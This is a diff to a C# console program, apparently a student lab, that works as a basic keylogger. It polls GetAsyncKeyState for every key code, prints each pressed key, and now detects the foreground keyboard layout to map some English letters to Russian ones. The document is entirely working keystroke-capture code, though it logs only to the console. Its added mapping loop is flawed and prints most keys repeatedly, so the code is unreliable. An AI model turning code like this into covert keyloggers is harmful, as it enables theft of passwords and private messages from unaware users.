@@ -6,13 +6,17 @@ using System.Threading;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Globalization;
 
 namespace Lab4_1_
 {
     class Program
     {
+        public static char[] english = new[] { 'Q', 'W', 'E', 'R', 'T', 'Y', 'A' };
+        public static char[] russain = new[] { 'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Ф' };
         [DllImport("user32.dll")]
         public static extern short GetAsyncKeyState(Int32 i);
+
         static void Main(string[] args)
         {
             StartLogging();
@@ -22,17 +26,56 @@ namespace Lab4_1_
         {
             while (true)
             {
+                ushort n = GetKeyboardLayout();
                 Thread.Sleep(50);
                 for (Int32 i = 0; i < 255; i++)
                 {
                     short keyState = GetAsyncKeyState(i);
                     if (keyState == -32768)
                     {
-                        Console.WriteLine((Keys)i);
-                        
+                        int word = (int)i;
+                        if (n == 1033)
+                        {
+                            Console.WriteLine((Keys)word);
+                        }
+                        else
+                        {
+                            for (int ii = 0; ii < english.Length; ii++)
+                            {
+                                if (english[ii] == (char)word)
+                                {
+                                    Console.WriteLine(russain[ii]);
+                                }
+                                else
+                                {
+                                    Console.WriteLine((Keys)word);
+                                }
+                            }
+                        }
                     }
                 }
             }
+        }
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern int GetWindowThreadProcessId(
+            [In] IntPtr hWnd,
+            [Out, Optional] IntPtr lpdwProcessId
+            );
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern ushort GetKeyboardLayout(
+            [In] int idThread
+            );
+
+        /// <summary>
+        /// Вернёт Id раскладки.
+        /// </summary>
+        static ushort  GetKeyboardLayout()
+        {
+            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
         }
     }
 }
